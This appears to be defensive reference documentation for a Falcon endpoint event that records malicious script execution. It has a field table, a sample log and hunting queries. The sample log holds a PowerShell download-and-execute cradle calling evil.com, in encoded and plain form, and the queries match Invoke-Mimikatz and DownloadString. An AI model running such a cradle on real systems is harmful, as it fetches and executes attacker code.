## ScriptControlDetectInfo Table: Malicious Script Execution Event

### 1. Table Name
**ScriptControlDetectInfo**

---

### 2. Table Usage
This event is sent when Falcon has detected malicious script content being executed on the host. This event provides the details of exactly what content was detected, which is invaluable for investigating fileless malware, obfuscated commands, and other in-memory threats.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`). | All |
| ParentImageFileName | The full path to the parent process that spawned the script host. | All |
| CommandLine | The command line of the script host process. | All |
| HostProcessType | The type of process hosting the script engine. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language being used (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContentSource | The source of the script content (e.g., from the command line, a file, or interactive session). | Windows, Linux |
| ScriptContent | The full content of the script that was detected as malicious. | Windows, Linux |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "HostProcessType": "1",
  "ScriptingLanguageId": "1",
  "ScriptContentSource": "2",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')"
}
```
---

### 5. Example Queries
```xql
// Find all malicious script detections
event_simpleName=ScriptControlDetectInfo

// Hunt for malicious scripts executed by PowerShell
event_simpleName=ScriptControlDetectInfo ImageFileName="*\\powershell.exe"

// Find detections where the script was passed via an encoded command line
event_simpleName=ScriptControlDetectInfo ScriptContentSource=3

// Search for specific malicious functions or commands within the script content
event_simpleName=ScriptControlDetectInfo ScriptContent="*Invoke-Mimikatz*" OR ScriptContent="*DownloadString*"

// Look for detections involving VBScript or JScript
event_simpleName=ScriptControlDetectInfo ScriptingLanguageId IN (4, 5)

// Find malicious scripts spawned by Microsoft Office applications
event_simpleName=ScriptControlDetectInfo ParentImageFileName IN ("*\\winword.exe", "*\\excel.exe", "*\\powerpnt.exe")
```
